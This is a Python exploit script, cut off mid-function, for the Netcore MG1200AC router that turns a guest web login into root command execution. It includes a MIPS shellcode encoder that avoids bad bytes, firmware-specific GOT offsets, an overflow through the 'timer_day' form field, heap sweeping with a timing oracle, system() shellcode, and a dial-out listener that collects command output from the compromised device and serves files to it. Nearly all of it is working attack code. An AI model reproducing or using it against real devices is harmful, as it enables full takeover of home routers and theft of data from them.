#!/usr/bin/env python3

"""Netcore MG1200AC: guest web session -> uid 0 command execution on any stock
firmware."""

import argparse
import http.cookiejar
import json
import math
import os
import random
import socket
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request
from typing import NotRequired, TypedDict, cast

from Crypto.Cipher import AES

import mg1200ac_core as core


# ------------------------------------------------------------------ payload --
ENTRY = '/app/radio_power/radio_power.cgi'
CARRIER = 'zzz'
'the field no handler reads (README §5.1)'
BAD = {0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}
'bytes sscanf("%s") stops at'
SLEDWORD = 0x25084141.to_bytes(4, 'little')
'addiu $t0,$t0,0x4141: inert filler'
SLED = 0x800
"""Payload geometry. The carrier base is two-valued, so the sled covers 2 KB of
it and the value is the largest the web layer accepts (README §5.1, §6.3). slop
absorbed before the code"""
DATA_POS = 0x204
'$s0-relative offset of the command'
CMD_MAX = 0x400
'command budget inside SIZE'
SIZE = 0x1000
'value length: fixes the heap chunk'
COARSE = SLED
'lands iff V <= E <= V+SLED'
SPIN = 0x30303030
'counted-spin iterations for the landing probe'
T_MISS = 0.5
'anything faster than this did not run the gate'

ROMS: dict[str, core.Preset] = {
    'v107': {
        'pads': [76], 'anchors': [
            ('abs', 0x004131c8, 'memset'),
            ('abs', 0x004131dc, 'write'),
            ('abs', 0x004131e4, 'strlen'),
            ('gp', -0x7f10, 'memset')
        ]
    },
    'v127': {'pads': [108], 'anchors': [('abs', 0x004127bc, 'memset')]},
    'sh121': {'pads': [108], 'anchors': [('abs', 0x004127bc, 'memset')]},
}
"""Per-firmware candidates, selected by the version the device reports
(README §7.2), never by trial. `abs` = a GOT slot of the ET_EXEC host holding a
resolved libc pointer, `sym` names it; `gp` reads $(gp + disp) instead"""
HEAP_LO, HEAP_HI = 0x00414008, 0x0042c008
'brk heap span to sweep'
MISS_PROBES = (0x00410108, 0x0040c108)
"""calibration aims: below the sweep window, so no carrier can ever land there
and raise the miss baseline (README §6.2)"""

# -------------------------------------------------------------- web session --
LOGIN_IV = b'360luyou@install'
GATE_MIN = 2
"floor for a measured gate: below this the answer is web noise"
GATE_MAX = 8
'ceiling for a measured gate'
GATE_MARGIN = 3
'the gate has to be this many times the slowest legitimate request'
GATE_TRIES = 3
'legitimate requests timed before a gate is picked'
REQ_TIMEOUT = 25
'per-request socket timeout; -t overrides it'
MAX_SHOTS = 3000
'ceiling on crashing requests; --max-requests overrides'
MAX_SWEEPS = 4
'full heap sweeps per run; --max-sweeps overrides'
CACHE_AGE = 86400
'a cache older than this is not trusted (seconds)'
IFS = '${IFS}'
"""the shell's space-class variable: a value may not hold a literal space, so
this is what separates arguments (README §4.5)"""
SAMPLE_USER = 'guest'
"""the web user this chain targets, which is what the sample credential is for;
the CLI never defaults a password - `--password` or nothing"""


class Cfg(TypedDict):
    pad: int
    anchor: core.Anchor
    aim: int
    aims: list[int]
    timeout: NotRequired[int]


# ---------------------------------------------------------- MIPS o32 encoder --
Shifts = dict[int, int]
'shift amount -> register holding it'

Z0, AT, V0 = 0, 1, 2
A0, A1, A2, A3 = 4, 5, 6, 7
T0, T1, T2, T3, T4, T5, T6, T7, T8, T9 = 8, 9, 10, 11, 12, 13, 14, 15, 24, 25
S0, S1, S2, S3, S4, S5, S6, S7 = 16, 17, 18, 19, 20, 21, 22, 23
GP, SP, FP, RA = 28, 29, 30, 31
FUN = {
    'sllv': 4, 'srlv': 6, 'jalr': 9, 'addu': 0x21, 'subu': 0x23, 'or': 0x25,
    'sltu': 0x2b}


class Bad(Exception):
    pass


def _chk(word: int, why: str, ws: bool = False) -> bytes:
    b = word.to_bytes(4, 'little')
    if b'\x00' in b:
        raise Bad(f'{word:08x} ({why}) encodes a NUL byte')
    if not ws and any(c in BAD for c in b):
        raise Bad(f'{word:08x} ({why}) encodes whitespace: {b.hex()}')
    return b


def R(rs: int, rt: int, rd: int, sa: int, f: int) -> int:
    return (rs << 21) | (rt << 16) | (rd << 11) | (sa << 6) | f


def I(op: int, rs: int, rt: int, imm: int) -> int:
    return (op << 26) | (rs << 21) | (rt << 16) | (imm & 0xffff)


class Asm:
    """MIPS o32 encoder that refuses any word containing a byte listed in BAD
    (README §4.5, §5.2). Register choices follow from that, not from style."""

    code: bytearray

    def __init__(self) -> None:
        self.code = bytearray()

    def bytes(self) -> bytes:
        return bytes(self.code)

    def _e(self, word: int, why: str, ws: bool = False) -> None:
        self.code += _chk(word, why, ws)

    def addu(self, rd: int, rs: int, rt: int) -> None:
        self._e(R(rs, rt, rd, 0, FUN['addu']), 'addu')

    def subu(self, rd: int, rs: int, rt: int) -> None:
        self._e(R(rs, rt, rd, 0, FUN['subu']), 'subu')

    def orr(self, rd: int, rs: int, rt: int) -> None:
        self._e(R(rs, rt, rd, 0, FUN['or']), 'or')

    def sltu(self, rd: int, rs: int, rt: int) -> None:
        self._e(R(rs, rt, rd, 0, FUN['sltu']), 'sltu')

    def sllv(self, rd: int, rt: int, rs: int) -> None:
        self._e(R(rs, rt, rd, 0, FUN['sllv']), 'sllv')

    def srlv(self, rd: int, rt: int, rs: int) -> None:
        self._e(R(rs, rt, rd, 0, FUN['srlv']), 'srlv')

    def addiu(self, rt: int, rs: int, imm: int) -> None:
        self._e(I(9, rs, rt, imm), 'addiu')

    def ori(self, rt: int, rs: int, imm: int) -> None:
        self._e(I(0x0d, rs, rt, imm), 'ori')

    def xori(self, rt: int, rs: int, imm: int) -> None:
        self._e(I(14, rs, rt, imm), 'xori')

    def lui(self, rt: int, imm: int) -> None:
        self._e(I(15, 0, rt, imm), 'lui')

    def lw(self, rt: int, rs: int, disp: int) -> None:
        self._e(I(0x23, rs, rt, disp), 'lw')

    def sb(self, rt: int, rs: int, disp: int) -> None:
        self._e(I(0x28, rs, rt, disp), 'sb')

    def bne(self, rs: int, rt: int, off: int) -> None:
        self._e(I(5, rs, rt, off), 'bne')

    def jalr(self, rd: int, rs: int) -> None:
        self._e(R(rs, 0, rd, 0, FUN['jalr']), 'jalr', ws=True)

    def bltzal(self, rs: int, off: int) -> None:
        self._e((1 << 26) | (rs << 21) | (
            0x10 << 16) | (off & 0xffff), 'bltzal')


def setreg(a: Asm, rt: int, value: int, sh: Shifts) -> None:
    """Put an arbitrary constant in a register: the value may contain NUL bytes,
    the encodings may not. `sh` is what `preamble` returned, so sh[0] is 0 and
    sh[1] is 1."""
    v = value & 0xffffffff
    if v == 0:
        a.orr(rt, sh[0], sh[0])
        return
    if v <= 0xffff:
        try:
            a.ori(rt, sh[0], v)
            return
        except Bad:
            pass
    for s in (16, 8, 12, 20, 24, 4, 28):
        if v % (1 << s) == 0 and v >> s <= 0xffff:
            try:
                a.ori(rt, sh[0], v >> s)
                _shift(a, rt, s, sh)
                return
            except Bad:
                continue
    hi, lo = v >> 16, v & 0xffff
    if hi and lo:
        try:
            a.ori(rt, sh[0], hi)
            _shift(a, rt, 16, sh)
            a.ori(rt, rt, lo)
            return
        except Bad:
            pass
    bits = bin(v)[2:]
    a.orr(rt, sh[0], sh[1])
    for bit in bits[1:]:
        a.sllv(rt, rt, sh[1])
        if bit == '1':
            a.addu(rt, sh[1], rt)


def _shift(a: Asm, rt: int, s: int, sh: Shifts) -> None:
    for part in (16, 8, 4, 2, 1):
        if s & part:
            a.sllv(rt, rt, sh[part])


def preamble(a: Asm) -> Shifts:
    """$t1 = 0 (kept live as the `zero` source), $t3 = 1, and the shift
    constants."""
    sh: Shifts = {}
    a.sltu(T1, T1, T1)
    a.xori(T3, T1, 0xffff)
    a.xori(T3, T3, 0xfffe)
    sh.update({0: T1, 1: T3})
    a.addu(T4, T3, T3)
    a.addu(T5, T4, T4)
    a.addu(T6, T5, T5)
    a.addu(T7, T6, T6)
    sh.update({2: T4, 4: T5, 8: T6, 16: T7})
    return sh


def offset(a: Asm, dst: int, delta: int, sh: Shifts) -> None:
    setreg(a, T8, abs(delta), sh)
    if delta >= 0:
        a.addu(dst, T8, dst)
    else:
        a.subu(dst, dst, T8)


def call(a: Asm) -> None:
    """Branch to the libc function held in $t9, copied to $t2 first because
    `jalr $ra,$t9` encodes a space (README §4.4)."""
    a.orr(T2, T1, T9)
    a.jalr(RA, T2)
    a.sltu(T0, T0, T0)


def load_got(a: Asm, sh: Shifts, addr: int) -> None:
    """$t9 = *addr for a fixed GOT address, without knowing where the buffer
    landed: materialise the 0x100-aligned address above it, walk back with a
    small addiu, then load through a non-zero displacement (0 encodes a NUL).
    Four instructions, no memory access. Whether that displacement and that
    addiu stay clean depends on the low byte of `addr`, so the candidates are
    tried in order - the first one is what the known GOTs encode to
    (README §5.2)."""
    for disp in (0x111, *range(0x104, 0x200, 4)):
        base = addr + disp
        pad = 0x100 - (base & 0xff)
        b = Asm()
        try:
            b.lui(T8, (base + pad) >> 8)
            b.srlv(T8, T8, sh[8])
            b.addiu(T8, T8, -pad)
            b.lw(T9, T8, -disp)
        except Bad:
            continue
        a.code += b.code
        return
    raise SystemExit(
        f'[!] cannot load *{addr:#010x} without a bad byte: this anchor needs '
        'a different GOT slot')


def spin(a: Asm, sh: Shifts, count: int) -> None:
    """Bounded delay in $s6 - a register the payload's own code does not
    otherwise use - as `bne $s6,$zero,-2`, which branches back over the addiu
    that just decremented it. The delay slot is the *next* word, so it belongs
    to the caller and must not touch $s6 (README §4.5, §6.2). The test cannot
    be `beq` and the counter cannot be $s1."""
    setreg(a, S6, count, sh)
    a.addiu(S6, S6, -1)
    # backwards over itself; next word is the delay slot
    a.bne(S6, Z0, -2)


def fault(a: Asm) -> None:
    a.ori(T2, T1, 0x0101)
    a.jalr(RA, T2)
    a.sltu(T1, T1, T1)

# ------------------------------------------------------------------- payload --


def code_land(count: int) -> bytes:
    """Landing probe: bltzal, then a counted spin, then a fault. It touches no
    memory and needs none of the firmware constants, so a late answer can only
    mean the sled was entered - which keeps landing measurement independent of
    the anchor."""
    a = Asm()
    a.bltzal(Z0, -1)
    sh = preamble(a)
    spin(a, sh, count)
    fault(a)
    return a.bytes()


def code_cmd(cmd: bytes, anchor: core.Anchor) -> bytes:
    """system(cmd); exit() (README §4.6). `$s0`, from bltzal, locates the
    command inside the same value, so the code stays position independent
    (README §5.2)."""
    a = Asm()
    a.bltzal(Z0, -1)
    sh = preamble(a)
    a.orr(S0, RA, sh[0])
    kind, addr, sym = anchor
    if kind == 'abs':
        load_got(a, sh, addr)
    else:
        a.lw(T9, GP, addr)
    a.orr(S3, sh[0], T9)
    offset(a, S3, core.LIBC['system'] - core.LIBC[sym], sh)
    a.addiu(A0, S0, DATA_POS)
    a.sltu(T6, T6, T6)
    a.sb(T6, S0, DATA_POS + len(cmd))
    a.orr(T9, sh[0], S3)
    call(a)
    a.sltu(T1, T1, T1)
    sh = preamble(a)
    a.orr(S2, sh[0], S3)
    offset(a, S2, core.LIBC['exit'] - core.LIBC['system'], sh)
    a.orr(T9, sh[0], S2)
    call(a)
    return a.bytes()


def ifs(cmd: str) -> bytes:
    """Render a shell command line as a form value: every space becomes
    `${IFS}`, so the value holds no byte that sscanf() would stop at (README
    §4.5).

    Write the command as you would at a prompt. Two limits survive expansion: a
    control word (`for`, `do`, `if`) needs a real space and so cannot be sent
    this way, and a redirected filename must end at a literal operator
    (`</tmp/p|cat`), never at a `${IFS}` that would be swallowed into the
    name."""
    return cmd.replace(' ', IFS).encode()


def pad_cmd(cmd: bytes) -> bytes:
    """Append trailing `${IFS}` until the displacement of the terminating
    `sb` is itself a clean value, at constant total length (README §5.1)."""
    if not 0 < len(cmd) <= CMD_MAX - 7:
        # the budget is the part of the value the code does not use, minus the
        # slot and the terminator: a command line from the CLI can exceed it
        raise SystemExit(
            f'[!] the command is {len(cmd)} B, the value holds at most '
            f'{CMD_MAX - 7} B of it - read a file instead of inlining it')
    assert b'\x00' not in cmd
    sep = IFS.encode()
    for n in range(16):
        disp = DATA_POS + len(cmd) + n * len(sep)
        if not any(b in BAD for b in disp.to_bytes(2, 'little')):
            return cmd + sep * n
    raise SystemExit(
        '[!] no ${IFS} padding makes the terminator displacement clean')


def blob_for(code: bytes, cmd: bytes = b'', sled: int = SLED) -> bytes:
    cmd_off = sled + 8 + DATA_POS
    assert sled + len(code) <= SIZE, \
        f'{len(code)} B of code at {sled:#x} does not fit {SIZE:#x} B'
    if cmd:
        assert sled + \
            len(code) <= cmd_off, 'the code would overwrite the command'
        assert cmd_off + len(cmd) + \
            1 <= SIZE, 'the command does not fit the value'
    blob = bytearray(SLEDWORD * (SIZE // 4))
    blob[sled:sled + len(code)] = code
    if cmd:
        blob[cmd_off:cmd_off + len(cmd)] = cmd
        blob[cmd_off + len(cmd)] = 0x58          # -> NUL at run time
    bad = [
        i for i, b in enumerate(blob)
        if b in BAD and not (b == 0x09 and sled <= i < sled + len(code))]
    assert not bad, f'NUL/whitespace bytes at {bad[:8]}'
    return bytes(blob)


def make_body(blob: bytes, pad: int, addr: int) -> bytes:
    """`timer_day` overflows into the saved $ra; CARRIER is a field the handler
    never queries and it carries the payload (README §2, §3, §5.1)."""
    low = addr.to_bytes(4, 'little')[:3]
    if not clean(addr):
        raise SystemExit(f'{addr:#010x} has a byte that would end the %s copy')
    gate = [
        ('action', b'mod'), ('idx', b'0'), ('power', b'0'),
        ('timer_enable', b'1'), ('start_hour', b'1'), ('start_minute', b'1'),
        ('end_hour', b'2'), ('end_minute', b'2')]
    pairs = gate[:2] + [(CARRIER, blob)] + gate[2:] + \
        [('timer_day', b'Z' * pad + low)]
    return '&'.join(f'{k}={pct(v)}' for k, v in pairs).encode()


def pct(v: bytes) -> str:
    """Escape every byte so request length is content-independent
    (README §6.1)."""
    return ''.join(f'%{b:02X}' for b in v)


def clean(addr: int) -> bool:
    return all(b not in BAD for b in addr.to_bytes(4, 'little')[:3])

# ---------------------------------------------------------- session handling --


def put_cookie(cj: http.cookiejar.CookieJar, rhost: str, name: str,
               val: str) -> None:
    """Install one session cookie. The device keys its session on a cookie as
    well as on token_id, so a cached token is useless without them (measured:
    token alone answers 302 -> /login.htm), which is why the run cache stores
    both."""
    cj.set_cookie(http.cookiejar.Cookie(
        0, name, val, None, False, rhost, True, False,
        '/', True, False, None, False, None, None, {}))


def jar_cookies(cj: http.cookiejar.CookieJar) -> dict[str, str]:
    """The session cookies as {name: value} - JSON-ready, sorted for a stable
    file."""
    return {c.name: c.value or '' for c in sorted(cj, key=lambda c: c.name)}


def guest_login(
        rhost: str, user: str, password: str,
        verbose: bool = False
) -> tuple[urllib.request.OpenerDirector, http.cookiejar.CookieJar, str]:
    """Fetch the server's AES key, encrypt the password with it, keep the
    cookies and the token_id. Returns (opener, cookie jar, token)."""
    base = f'http://{rhost}'
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    rk = json.load(op.open(
        f'{base}/router/get_rand_key.cgi?noneed=noneed&key_index=',
        timeout=8))['rand_key']
    ki, kb = rk[:32], bytes.fromhex(rk[32:64])

    def enc(s: str) -> str:
        pad = 16 - len(s.encode()) % 16
        ciph = AES.new(kb, AES.MODE_CBC, LOGIN_IV)  # type: ignore
        return ''.join((ki, ciph.encrypt((s + chr(pad) * pad).encode()).hex()))

    d = urllib.parse.urlencode(
        {'user': user, 'pass': enc(password), 'from': '1'}).encode()
    raw = op.open(
        urllib.request.Request(f'{base}/router/web_login.cgi', data=d),
        timeout=8).read()
    try:
        tok = json.loads(raw)['token_id']
    except KeyError:
        detail = raw[:90].decode(errors='replace')
        raise SystemExit(f'login refused: {detail}')
    except ValueError:
        raise SystemExit(f'login returned no JSON: {raw[:90]!r}')
    for name, val in (
            ('us', urllib.parse.quote(enc(user))), ('ukey', kb.hex())):
        put_cookie(cj, rhost, name, val)
    if verbose:
        print('    login ok')
    return op, cj, tok


class Session:
    """One reused login: the device's session table is small and slow to free,
    so a login per request locks the tool out (README §8.2). A token carried
    over from an earlier run is trusted until the device proves it dead - which
    is what `--password` is for. A dead session is detected from the HTML login
    page boa returns for a bad token, never from an empty body."""

    op: urllib.request.OpenerDirector
    tok: str
    logins: int
    shots: int
    plain: int
    max_shots: int
    sweeps: int
    max_sweeps: int

    def __init__(
            self, rhost: str, user: str, password: str,
            max_shots: int = MAX_SHOTS, max_sweeps: int = MAX_SWEEPS,
            token: str = '',
            cookies: dict[str, str] | None = None) -> None:
        self.rhost, self.user, self.password = rhost, user, password
        self.logins, self.shots = 0, 0
        self.sweeps, self.plain = 0, 0
        self.max_shots, self.max_sweeps = max_shots, max_sweeps
        self.tok = token
        self.cj = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cj))
        if token and cookies:
            for name, val in cookies.items():
                put_cookie(self.cj, rhost, name, val)
            print(f'[+] reusing the cached web session for {user}@{rhost}')
        else:
            self.relogin()

    def cookies(self) -> dict[str, str]:
        return jar_cookies(self.cj)

    def relogin(self) -> None:
        """Spend a credential: only needed for a cold start or an expired
        token."""
        if not self.password:
            raise SystemExit(
                '[!] this run needs a login and no password was given: the '
                'cached session is either absent or no longer accepted - pass '
                '--password')
        self.op, self.cj, self.tok = guest_login(
            self.rhost, self.user, self.password)
        self.logins += 1

    def shot(
            self, blob: bytes, pad: int, addr: int,
            timeout: int = REQ_TIMEOUT) -> tuple[float, bytes]:
        if self.shots >= self.max_shots:
            raise SystemExit(
                f'[!] stopped at the {self.max_shots}-request ceiling: every '
                'miss crashes a CGI child, so this device is not being '
                'hammered further (raise it with --max-requests if the sweep '
                'really needs it)')
        self.shots += 1
        dt, d = self._post(blob, pad, addr, timeout)
        if b'<head>' in d:
            # the token was refused: either it expired or the session table
            # filled up
            try:
                self.relogin()
            except SystemExit as e:
                raise SystemExit(
                    f'{e}\n[!] the session table fills and frees entries only '
                    'by itself (~12 min, README §8.2): wait and re-run, or '
                    'pass --addr to skip the sweep')
            self.shots += 1
            dt, d = self._post(blob, pad, addr, timeout)
        return dt, d

    def _post(
            self, blob: bytes, pad: int, addr: int,
            timeout: int) -> tuple[float, bytes]:
        req = urllib.request.Request(
            f'http://{self.rhost}{ENTRY}', data=make_body(blob, pad, addr),
            headers={'token_id': self.tok})
        t0 = time.time()
        try:
            with self.op.open(req, timeout=timeout) as f:
                return time.time() - t0, f.read()
        except Exception as e:
            # A negative time marks "no measurement": a socket timeout lasts
            # longer than any threshold, so the latency oracle must never read
            # it as a landing - and timeouts are likeliest exactly when the
            # payload runs and keeps the pipe open (README §4.6).
            return -(time.time() - t0), repr(e).encode()[:40]


def cmd_blob(cmd: bytes, anchor: core.Anchor, sled: int = SLED) -> bytes:
    """The code and its command have to go into the same blob: the shellcode
    reads the command from a fixed offset inside the *value*, so leaving
    it out makes the child run `system("AAAA\\x08...")` - which returns
    fast and looks exactly like a miss."""
    blob = code_cmd(cmd, anchor)
    return blob_for(blob, cmd, sled=sled)


# --------------------------------------------------- finding and proving --
def sanitize_cmd(text: str) -> bytes:
    """Validate a typed command line, then render it with ifs(). A space
    inside a quoted string becomes a separator too."""
    cmd = ifs(text)
    bad = sorted({b for b in cmd if b in BAD})
    if bad:
        hexes = ', '.join(f'0x{b:02x}' for b in bad)
        raise SystemExit(
            f'[!] the command contains byte(s) {hexes} that would truncate it '
            'in the form value (NUL, tab, space, or CR/LF/VT/FF) - remove them')
    return cmd


def gated_cmd(cmd: bytes, secs: int) -> bytes:
    return pad_cmd(ifs(f'{cmd.decode()} && sleep {secs}'))


def gate_slow(secs: int) -> float:
    """Threshold for a `cmd && sleep secs` gate: a crash cannot approach half
    the sleep, and T_MISS floors it for very short gates (README §6.2)."""
    return max(T_MISS, secs / 2)


def get_body() -> bytes:
    """The same form with `action=get` and a legal `timer_day`: this entry
    answers it read-only, so it measures the web layer without storing a timer
    entry or killing a child (README §8.2)."""
    pairs = [
        ('action', b'get'), ('idx', b'0'), ('power', b'0'),
        ('timer_enable', b'1'), ('timer_day', b'1')]
    return '&'.join(f'{k}={pct(v)}' for k, v in pairs).encode()


def measure_gate(
        s: Session, timeout: int, forced: int = 0,
        quiet: bool = False) -> int:
    """How long the gate's `sleep` has to be to mean anything on this device
    right now. A fixed 8 seconds was a guess that made every verdict cost eight
    seconds, so this asks the box how long an ordinary answered request takes
    and puts the gate a margin above the slowest of several - which is also the
    only honest way to compare a busy device with a hung one. Clamped both
    ways: under `GATE_MIN` nothing separates the two, over `GATE_MAX` the run
    stops being quick (README §6.4).

    `--secs` skips the measurement and uses that gate as given."""
    if forced:
        if not quiet:
            print(f'  gate set by --secs: sleep {forced}s, late above '
                  f'{gate_slow(forced):.2f}s')
        return forced
    lat: list[float] = []
    for _ in range(GATE_TRIES):
        s.plain += 1
        req = urllib.request.Request(
            f'http://{s.rhost}{ENTRY}', data=get_body(),
            headers={'token_id': s.tok})
        t0 = time.time()
        try:
            with s.op.open(req, timeout=timeout) as f:
                f.read()
            lat.append(time.time() - t0)
        except OSError:
            # a request that never answered says nothing about how long one
            # takes; the floor keeps the gate usable rather than guessing high
            pass
    if not lat:
        print(
            f'  [!] none of the {GATE_TRIES} read-only requests was answered: '
            'a gate cannot be measured against an unresponsive web layer, so '
            'the floor is used - pass --secs to set it yourself')
    base = max(lat) if lat else 0.0
    need = math.ceil(base * GATE_MARGIN)
    if need > GATE_MAX:
        # the sleep cannot be stretched forever: past GATE_MAX the answer stops
        # being separable from this device's ordinary latency, and guessing is
        # exactly how a gate starts producing false hits (README §6.4)
        raise SystemExit(
            f'[!] ordinary requests here already take {base:.2f}s, so a gate '
            f'of at most {GATE_MAX}s cannot separate them: pass --secs {need} '
            'or more, or re-run when the web layer is quieter')
    secs = max(GATE_MIN, need)
    if not quiet:
        print(
            f'  gate measured: {len(lat)}/{GATE_TRIES} read-only requests, '
            f'slowest {base:.2f}s -> sleep {secs}s, late above '
            f'{gate_slow(secs):.2f}s')
    return secs


def calibrate(
        s: Session, pad: int, quiet: bool = False,
        timeout: int = REQ_TIMEOUT) -> tuple[float, float]:
    """How long a definite miss takes on this device right now; every latency
    rule here is relative to it (README §6.2)."""
    probe = blob_for(code_land(SPIN), sled=0x400)
    hits = [s.shot(probe, pad, a, timeout=timeout)[0] for a in MISS_PROBES]
    valid = [dt for dt in hits if dt >= 0]
    if not valid:
        raise SystemExit(
            f'[!] neither probe was answered in {timeout}s; the device is not '
            'serving (or the timeout is too small) - nothing can be measured')
    # the *fastest* clean crash is the baseline: one straggler must not raise
    # the threshold for the whole run and turn real landings into misses
    # (README §6.2)
    miss = min(valid)
    slow = max(miss * 3, miss + 0.4)
    if not quiet:
        print(
            f'  probe calibrated: miss {miss:.2f}s, landing expected > '
            f'{slow:.2f}s')
    return miss, slow


def locate(
        s: Session, pad: int, slow: float, lo: int = HEAP_LO,
        hi: int = HEAP_HI, quiet: bool = False,
        timeout: int = REQ_TIMEOUT) -> list[int]:
    """Find addresses that provably enter the sled, best first. Stepping by
    the sled length (COARSE) tiles the heap with no gap, so any hit brackets the
    carrier base to within one sled; the returned aims are addresses that were
    actually seen to land."""
    probe = blob_for(code_land(SPIN))
    aims: list[int] = []
    s.sweeps += 1
    # two passes: the carrier alternates between two heap slots (README §6.3)
    for _ in range(2):
        for a in range(lo, hi, COARSE):
            if not clean(a) or a in aims:
                continue
            dt, _ = s.shot(probe, pad, a, timeout=timeout)
            # one slow reply is not evidence: confirm before spending later
            # shots on this address (a busy boa can delay any request,
            # README §6.2)
            if dt > slow and s.shot(probe, pad, a, timeout=timeout)[0] > slow:
                aims.append(a)
                if not quiet:
                    print(f'  landing at {a:#010x} ({dt:.2f}s, confirmed)')
    return aims


def negotiate(
        s: Session, aims: list[int], pads: list[int],
        anchors: list[core.Anchor], secs: int, quiet: bool = False,
        timeout: int = REQ_TIMEOUT) -> Cfg | None:
    """First (pad, anchor, aim) whose gated root-only command delays is this
    firmware's configuration; a wrong one cannot reach system() and answers
    immediately. The gate is the run's measured one, because hunting is exactly
    where a wrong guess is cheap and a slow web layer is not."""
    for pad in pads:
        for anchor in anchors:
            blob = cmd_blob(gated_cmd(ifs('kill -0 1'), secs), anchor)
            slow = gate_slow(secs)
            for aim in aims:
                dt, hit = 0.0, False
                # the retry loop below always runs once
                for attempt in range(AIM_TRIES):
                    # the carrier is two-valued, so retry one aim before moving
                    # on
                    dt, _ = s.shot(blob, pad, aim, timeout=timeout)
                    hit = dt > slow
                    if hit:
                        # confirm: locking in a (pad, anchor) from one slow
                        # reply would misreport this firmware's configuration
                        dt, _ = s.shot(blob, pad, aim, timeout=timeout)
                        hit = dt > slow
                    if hit or attempt == AIM_TRIES - 1:
                        break
                if not quiet:
                    verdict = 'HIT' if hit else 'miss'
                    print(
                        f'  try pad={pad:<3} '
                        f'anchor={core.describe(anchor):<22} '
                        f'aim={aim:#010x} -> {dt:5.2f}s {verdict}')
                if hit:
                    cfg: Cfg = {
                        'pad': pad, 'anchor': anchor, 'aim': aim,
                        'aims': aims, 'timeout': timeout}
                    return cfg
    return None


def hit_aim(
        s: Session, cfg: Cfg, blob: bytes, slow: float,
        quiet: bool = False) -> tuple[int | None, float | None, bytes | None]:
    """Fire at every aim known to land, AIM_TRIES times each, then sweep again.
    The carrier is two-valued, so retrying across known aims is what makes a
    shot reliable (README §6.3). Returns a hit only for a latency that really
    crossed `slow`."""
    def attempt(aim: int) -> tuple[float | None, bytes | None]:
        for _ in range(AIM_TRIES):
            dt, d = s.shot(
                blob, cfg['pad'], aim,
                timeout=cfg.get('timeout', REQ_TIMEOUT))
            if dt > slow:
                # one slow reply is not evidence, and here it buys a whole
                # command execution: confirm it with a second shot at the same
                # aim before believing it (README §6.2)
                dt, d = s.shot(
                    blob, cfg['pad'], aim,
                    timeout=cfg.get('timeout', REQ_TIMEOUT))
                if dt > slow:
                    return dt, d
        return None, None

    for aim in cfg.get('aims') or [cfg['aim']]:
        dt, d = attempt(aim)
        if dt:
            return aim, dt, d
    if not quiet:
        print('  known aims did not take; re-sweeping the heap')
    if s.sweeps >= s.max_sweeps:
        # measured on a cold-booted SH board: during a long read-back the
        # carrier can leave both known slots, and every sweep costs the whole
        # window (~180 crashing requests), so re-hunting must not eat the run's
        # traffic budget
        if not quiet:
            print(
                f'  sweep budget ({s.max_sweeps}) spent: read one bit with '
                '--grep rather than a dial-out, or re-run for a fresh carrier')
        return None, None, None
    # The re-sweep fires the counted-spin landing probe, whose answer is ~3.5 s
    # on this board, not the gate's `secs`: reusing `slow` here would read a
    # real landing as a miss whenever secs/2 exceeds it (README §6.2).
    _miss, land = calibrate(
        s, cfg['pad'], True, timeout=cfg.get('timeout', REQ_TIMEOUT))
    cfg['aims'] = locate(
        s, cfg['pad'], land, quiet=True,
        timeout=cfg.get('timeout', REQ_TIMEOUT))
    for aim in cfg['aims']:
        dt, d = attempt(aim)
        if dt:
            cfg['aim'] = aim
            return aim, dt, d
    return None, None, None


def delayed(
        s: Session, cfg: Cfg, blob: bytes, slow: float,
        quiet: bool = False) -> tuple[bool, float, bytes]:
    """True if the payload in `blob` ran as far as the `sleep` that ends it.
    Whoever built the blob owns `slow`: it has to be the threshold for *that*
    sleep, since a gate in the middle of a command line answers only for what
    it is attached to (README §6.4)."""
    aim, dt, d = hit_aim(s, cfg, blob, slow, quiet)
    if aim is None or dt is None or d is None:
        return False, 0.0, b''
    return True, dt, d


def gated(
        s: Session, cfg: Cfg, cmd: bytes, secs: int,
        quiet: bool = False) -> tuple[bool, float, bytes]:
    """True if `cmd && sleep secs` delayed, i.e. the chain ran `cmd`
    (README §6.4)."""
    return delayed(
        s, cfg, cmd_blob(gated_cmd(cmd, secs), cfg['anchor']),
        gate_slow(secs), quiet)


def pat_clean(pat: str) -> str:
    """Rewrite a grep pattern so it can travel inside a form value: space
    becomes the POSIX class, any other unshippable byte becomes `.`
    (README §7.1)."""
    return ''.join(
        '[[:space:]]' if c == ' ' else '.' if ord(c) in BAD else
        c for c in pat)


def tmp_for(tag: str) -> str:
    """A per-invocation scratch file on the target, for embedding in a
    command."""
    return '/tmp/o' + tag


DIAL_READ = 2.0
"""how long the listener waits on one request before answering it: stock wget
never closes after sending, so the read has to time out first (README §7.2)"""


class Dial:
    """The operator's side of the dial-out channel: one listener that both
    collects results and hands files to the device (README §7.2).

    A raw socket, not an HTTP stack - the device puts its payload in the request
    line, newlines and all. Every request is answered immediately, because stock
    wget has no timeout option and a stalled response would hold the web request
    and its CGI child open. Two URL shapes, all under one random per-run token:

    GET /<token>?<key>?<payload>   the payload arrives and is stored under <key>
    GET /<token>up/<name>          the registered bytes go out to the device"""

    def __init__(self, host: str, port: int) -> None:
        self.host, self.port = host, port
        self.token = f'{random.randrange(1 << 48):06x}'
        self.files: dict[str, bytes] = {}
        self.got: dict[str, str] = {}
        # what the device actually asked for, for diagnostics when a transfer
        # fails
        self.seen: list[str] = []
        self.lock = threading.Lock()
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((host, port))
        except OSError as e:
            raise SystemExit(
                f'[!] cannot listen for the dial-out on {host}:{port}: {e} '
                'pass --lhost/--lport, or use `run --grep` (needs no listener)')
        srv.listen(16)
        self.srv, self.stop = srv, threading.Event()
        threading.Thread(target=self._serve, daemon=True).start()

    def url(self, tail: str) -> str:
        return f'http://{self.host}:{self.port}/{self.token}{tail}'

    def hand(self, body: bytes) -> str:
        """Register bytes for the device to fetch and return the URL to give
        it."""
        name = f'f{random.randrange(1 << 32):08x}'
        with self.lock:
            self.files[name] = body
        return self.url(f'up/{name}')

    def _serve(self) -> None:
        self.srv.settimeout(0.5)
        while not self.stop.is_set():
            try:
                c, _ = self.srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            self._one(c)
        self.srv.close()

    def _one(self, c: socket.socket) -> None:
        c.settimeout(DIAL_READ)
        buf = b''
        while True:
            try:
                d = c.recv(65536)
